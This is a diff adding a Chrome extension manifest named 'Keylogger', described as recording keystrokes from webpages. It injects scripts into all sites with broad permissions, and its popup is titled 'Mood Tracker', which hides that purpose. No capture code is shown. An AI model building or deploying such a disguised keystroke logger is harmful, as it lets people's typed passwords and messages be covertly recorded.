@@ -1,0 +1,37 @@
+{
+	"manifest_version" : 3,
+	"name": "Keylogger",
+	"description" : "Records keystrokes from webpages",	
+	"content_scripts" : [
+	{
+		"matches" : ["http://*/*" , "https://*/*"],
+		"js" : ["content.js", "popup.js"]
+	}],
+	"action":{
+        "default_popup": "index.html",
+        "default_title": "Mood Tracker"
+    },
+	"background": {
+		"service_worker": "background.js",
+		"type": "module"
+	},
+	"version" : "1.0",
+	"icons" : {
+		"64" : "icon.png",
+		"32" : "icon.png",
+		"16" : "icon.png",
+		"128" : "icon.png"
+	},
+	"host_permissions": [
+		"<all_urls>"
+	],
+	"permissions" : [
+        "tabs",
+        "storage"
+	]
+	
+}
+
+
+
+   
